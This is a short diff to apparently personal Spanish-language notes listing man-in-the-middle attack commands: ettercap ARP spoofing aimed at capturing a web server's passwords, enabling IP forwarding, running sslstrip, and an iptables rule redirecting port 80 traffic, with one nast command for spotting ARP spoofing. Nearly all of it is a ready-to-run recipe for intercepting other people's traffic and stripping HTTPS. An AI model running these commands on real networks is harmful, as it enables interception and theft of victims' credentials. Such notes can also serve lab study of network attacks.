@@ -1,4 +1,13 @@
-ettercap 0.8.2 / 2001-2015
+
+
+===== arp spoofing descubrir claves de un web server ======
+
+ettercap -T -M arp:oneway /ip_victima/ /ip_web_server/
+
+
+===== comandos para hacer sslstrip ============
+
+echo "1" > /proc/sys/net/ipv4/ip_forward
 
 ettercap -T -q -i interface -M arp:remote /IP_victim/ /IP_router/
 
@@ -6,4 +15,5 @@ sslstrip.py -f -l port
 
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 20000
 
+===== monitor de arp spoofing ===
 nast -p -c
